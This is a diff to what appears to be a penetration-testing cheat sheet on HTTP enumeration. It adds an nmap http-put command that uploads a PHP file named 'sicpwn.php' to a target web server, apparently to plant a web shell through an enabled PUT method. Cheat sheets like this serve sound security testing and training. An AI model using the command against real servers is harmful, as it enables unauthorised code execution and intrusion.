@@ -34,6 +34,10 @@ HTTP Enumeration with NMAP
      # nmap --script=http-enum -p80 -n $ip/24
 Nmap Check the server methods
      # nmap --script http-methods --script-args http-methods.url-path='/test' $ip
+     
+---------------- HTTP PUT ----------------
+HTTP Put
+nmap -p80 $ip --script http-put --script-args http-put.url='/test/sicpwn.php',http-put.file='/var/www/html/sicpwn.php
 
 -------------------- Fuzzing --------------------
 Wfuzz - The web brute forcer
